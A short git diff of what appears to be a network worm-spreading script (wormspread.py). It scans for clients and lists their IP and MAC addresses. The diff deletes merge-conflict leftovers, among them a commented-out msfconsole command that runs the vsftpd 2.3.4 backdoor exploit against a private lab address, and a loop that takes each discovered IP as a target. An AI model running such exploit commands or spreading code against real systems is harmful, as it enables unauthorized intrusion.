@@ -29,22 +29,3 @@ print("IP" + " "*18+"MAC")
 
 for client in clients:
     print("{:16}    {}".format(client['ip'], client['mac']))
-
-<<<<<<< HEAD:wormspread.py
-for client in clients:
-    target = client['ip']
-=======
-
-#define function to launch msfconsole
-
-#In os.system
-
-#msfconsole -q -x " use exploit/unix/ftp/vsftpd_234_backdoor; set rhost 192.168.56.111; run
-
-
-
-
-
-
-    		
->>>>>>> 4e2f4293411c825532d5c348237449bac7762093:spreading
